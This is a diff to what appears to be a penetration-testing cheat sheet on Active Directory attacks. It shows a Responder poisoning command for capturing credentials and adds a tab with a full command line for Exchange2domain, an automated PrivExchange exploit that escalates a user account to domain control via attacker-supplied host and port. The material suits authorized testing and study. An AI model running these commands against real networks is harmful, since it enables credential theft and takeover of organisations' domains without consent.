@@ -73,6 +73,14 @@ We can now use LLMNR/NBT-NS/mDNS poisoning with responder, to capture credential
 responder -i eth0
 ```
 {% endtab %}
+
+{% tab title="Exploit - Auto" %}
+[Exchange2domain](https://github.com/Ridter/Exchange2domain) is a all in One tools of Privexchange exploit. You only need to open the web server port, so no high privileges are required.
+
+```bash
+python2.7 Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
+```
+{% endtab %}
 {% endtabs %}
 
 ## References
